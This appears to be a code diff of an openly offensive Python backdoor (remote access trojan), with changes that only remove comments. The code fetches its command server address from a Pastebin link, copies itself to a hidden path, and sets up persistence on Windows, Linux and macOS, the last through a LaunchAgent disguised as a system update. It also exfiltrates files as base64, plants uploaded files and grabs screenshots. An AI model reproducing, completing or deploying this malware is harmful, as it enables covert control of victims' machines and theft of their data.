@@ -19,10 +19,10 @@ import pyautogui
 def fetch_c2_ip():
     try:
         url = "https://pastebin.com/raw/DjTikqsH" # This is mine change it to ur Pastebin link
-        response = requests.get(url, timeout=5) # Sends GET request to URL
-        return response.text.strip() # Returns content of URL as string
+        response = requests.get(url, timeout=5) 
+        return response.text.strip() 
     except:
-        return "Server down for pastebin" # If URL not reachable
+        return "Server down for pastebin" 
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -50,7 +50,7 @@ class Backdoor:
         else:
             return  # Unsupported OS
 
-        # Only copy if not already in the secret location
+        
         if os.path.abspath(current_path) != os.path.abspath(secret_path):
             try:
                 shutil.copyfile(current_path, secret_path)
@@ -68,7 +68,7 @@ class Backdoor:
         elif system == "Darwin":  # macOS
             self._mac_persistence()
         else:
-            pass  # Or log unsupported OS
+            pass  
 
     def _windows_persistence(self):
         import winreg
@@ -104,14 +104,14 @@ class Backdoor:
                 f.write(desktop_content)
             os.chmod(desktop_file, 0o755)
         except Exception as e:
-            pass  # Optionally log the error
+            pass  
 
     def _mac_persistence(self):
         plist_dir = os.path.expanduser("~/Library/LaunchAgents")
         if not os.path.exists(plist_dir):
             os.makedirs(plist_dir)
         plist_file = os.path.join(plist_dir, "com.apple.systemupdate.plist")
-        exec_path = sys.executable  # Path to the current Python executable or PyInstaller binary
+        exec_path = sys.executable  
         plist_content = f"""
         <?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -132,7 +132,7 @@ class Backdoor:
             with open(plist_file, "w") as f:
                 f.write(plist_content)
         except Exception as e:
-            pass  # Optionally log the error
+            pass 
 
     def reliable_send(self, data):
         json_data = json.dumps(data).encode()
@@ -182,30 +182,30 @@ class Backdoor:
             return "[-] Error: Path does not exist or is not a directory: " + path
 
     def read_file(self, path):
-        if not os.path.exists(path):  # Check if the file exists
+        if not os.path.exists(path): 
             return f"[-] Error: File at {path} does not exist."
         
         try:
-            with open(path, "rb") as file:  # Open the file in binary mode
-                return base64.b64encode(file.read()).decode()  # Read, encode, and return base64 string
+            with open(path, "rb") as file:  
+                return base64.b64encode(file.read()).decode()  
         except Exception as e:
-            return f"[-] Error reading file: {str(e)}"  # Return error if any exception occurs
+            return f"[-] Error reading file: {str(e)}"  
 
     def write_file(self, path, content):
         try:
-            # Decode the base64 content and handle invalid base64 data
+            
             decoded_content = base64.b64decode(content)
             
-            # Check if the content is empty after decoding (this can happen if the base64 content is corrupted)
+            
             if not decoded_content:
                 return "[-] Error: Decoded content is empty. Invalid base64 data."
             
-            # Check if the directory exists, if not, return an error
+           
             directory = os.path.dirname(path) or "."
             if not os.path.exists(directory):
                 return f"[-] Error: Directory does not exist: {directory}"
 
-            # Write the decoded content to the file
+            
             with open(path, "wb") as file:
                 file.write(decoded_content)
             
@@ -226,7 +226,6 @@ class Backdoor:
             if ImageGrab and system in ["Windows", "Darwin"]:
                 screenshot = ImageGrab.grab()
             else:
-                # Linux: Check if GUI is available
                 if os.environ.get("DISPLAY") is None:
                     return "[-] No GUI display available"
 
